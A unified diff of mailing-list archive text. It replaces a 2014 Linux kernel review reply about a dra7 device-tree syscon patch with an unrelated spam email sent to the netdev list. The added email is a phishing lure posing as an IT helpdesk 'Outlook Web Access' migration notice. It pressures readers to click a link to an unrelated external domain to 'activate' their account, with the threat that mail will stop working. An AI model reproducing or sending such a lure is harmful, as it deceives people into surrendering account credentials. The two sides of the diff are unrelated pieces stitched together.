@@ -1,32 +1,39 @@
-From: Tony Lindgren <tony@atomide.com>
-Subject: Re: [PATCH 04/13] ARM: dts: dra7: Add syscon regmap for CORE CONTROL
- area
-Date: Mon, 8 Sep 2014 10:47:03 -0700
-Message-ID: <20140908174702.GJ3238@atomide.com>
-References: <1410185442-907-1-git-send-email-rogerq@ti.com>
- <1410185442-907-5-git-send-email-rogerq@ti.com>
+From: Deborah Mayher <Deborahm@wrschool.net>
+Subject: RE:
+Date: Mon, 8 Sep 2014 11:36:40 -0600
+Message-ID: <6A286AB51AD8EC4180C4B2E9EF1D0A027AAD7F025F@exmb01.wrschool.net>
+References: <6A286AB51AD8EC4180C4B2E9EF1D0A027AAD7EFF1E@exmb01.wrschool.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: wg@grandegger.com, mkl@pengutronix.de, tglx@linutronix.de,
-	linux-omap@vger.kernel.org, linux-can@vger.kernel.org,
-	netdev@vger.kernel.org, mugunthanvnm@ti.com, george.cherian@ti.com,
-	balbi@ti.com, nsekhar@ti.com, nm@ti.com,
-	Tomi Valkeinen <tomi.valkeinen@ti.com>
-To: Roger Quadros <rogerq@ti.com>
-Return-path: <linux-can-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <1410185442-907-5-git-send-email-rogerq@ti.com>
-Sender: linux-can-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
+To: Deborah Mayher <Deborahm@wrschool.net>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from [192.199.228.4] ([192.199.228.4]:15029 "EHLO
+	sserver.wrschool.net" rhost-flags-FAIL-FAIL-OK-FAIL)
+	by vger.kernel.org with ESMTP id S1752973AbaIHSFp convert rfc822-to-8bit
+	(ORCPT <rfc822;netdev@vger.kernel.org>);
+	Mon, 8 Sep 2014 14:05:45 -0400
+In-Reply-To: <6A286AB51AD8EC4180C4B2E9EF1D0A027AAD7EFF1E@exmb01.wrschool.net>
+Content-Language: en-US
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-* Roger Quadros <rogerq@ti.com> [140908 07:11]:
-> Display and DCAN drivers use syscon regmap to access some registers
-> in the CORE control area. Add the syscon regmap node for this
-> area.
 
-Please repost the .dts changes in a separate series to avoid
-conflicts.
 
-Thanks,
 
-Tony
+
+________________________________
+From: Deborah Mayher
+Sent: Monday, September 08, 2014 10:13 AM
+To: Deborah Mayher
+Subject:
+
+
+
+IT_Helpdesk is currently migrating from old outlook to the new Outlook Web access 2014 to strengthen our security.  You need to update your account immediately for activation. Click the website below for activation:
+
+Click Here<http://motorgumishop.hu/tmp/393934>
+
+You will not be able to send or receive mail if activation is not complete.
+
+IT Message Center.
